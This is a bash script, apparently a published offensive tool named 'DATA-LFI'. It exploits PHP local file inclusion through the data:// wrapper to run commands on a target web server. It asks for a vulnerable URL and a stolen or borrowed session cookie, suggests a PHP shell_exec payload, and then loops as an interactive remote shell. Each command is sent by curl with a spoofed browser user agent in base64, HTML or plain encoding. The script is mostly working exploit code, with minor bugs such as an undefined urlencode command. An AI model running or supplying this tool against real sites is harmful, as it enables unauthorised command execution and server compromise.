#!/bin/bash
art=$(cat <<EOF
    ____  ___  _________         __    __________
   / __ \/   |/_  __/   |       / /   / ____/  _/
  / / / / /| | / / / /| |______/ /   / /_   / /  
 / /_/ / ___ |/ / / ___ /_____/ /___/ __/ _/ /   
/_____/_/  |_/_/ /_/  |_|    /_____/_/   /___/   
                                                 
EOF
)

echo -e "$art\n"
echo -e "https://github.com/lsbxa\n"
echo "Url example: target.com/index?page="
echo "Enter cookie if its necessary"
echo -e "Payload example: <?php echo shell_exec("ls -la"); ?>\n"
echo -n "[+] Enter the url: "
read url
  
trap 'echo "[-] Interruption caugth.! exiting..."; exit 0' SIGINT

echo -n "[+] Type the cookie session: "
read cookie
echo "[+] Choose type data [+]"
echo "[+] 1 - base64"
echo "[+] 2 - html"
echo "[+] 3 - plain"
read choose
if [ "$choose" == "1" ];then
  while [ "1" ]; do
    echo -n "$ "
    read input
    if [ "$input" == "exit" ]; then
      break
    fi
    encoded=$(echo -n $input | base64)
    response=$(curl -X POST -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -b "$cookie" "http://"$url"data://text/plain;base64,$encoded" -i -s)
    http_code=$(echo "$response" | grep "200" | cut -d " " -f 2 | head -n 1)
    if [ "$http_code" != "200" ]; then  
      echo "[-] Error on the request $http_code [-]"
      echo "[-] Breaking loop..."
      break
    else
        echo "$response"
    fi
  done
elif [ "$choose" == "2" ];then
  while [ "1" ]; do
    echo -n "$ "
    read input
    if [ "$input" == "exit" ]; then
      break
    fi
    encoded=$(urlencode $input)
    response=$(curl -X POST -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -b "$cookie" "http://"$url"data://text/html,$encoded" -i -s)
    http_code=$(echo "$response" | grep "200" | cut -d " " -f 2 | head -n 1)
    if [ "$http_code" != "200" ]; then  
      echo "[-] Error on the request $http_code"
      echo "[-] Breaking loop..."
      break
    else
        echo "$response"
    fi
  done
elif [ "$choose" == "3" ];then
  while [ "1" ]; do
    echo -n "$ "
    read input
    if [ "$input" == "exit" ]; then
      break
    fi
    encoded=$(urlencode $input)
    response=$(curl -X POST -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -b "$cookie" "http://"$url"data://text/plain,$encoded" -i -s)
    http_code=$(echo "$response" | grep "200" | cut -d " " -f 2 | head -n 1)
    if [ "$http_code" != "200" ]; then
      echo "[-] Error on the request $http_code"
      echo "[-] Breaking loop..."
      break
    else
        echo "$response"
    fi  
  done
else
  echo "[-] Invalid input"
  echo "[-] Enter 1 or 2"
  echo "[-] shutting down..."
fi
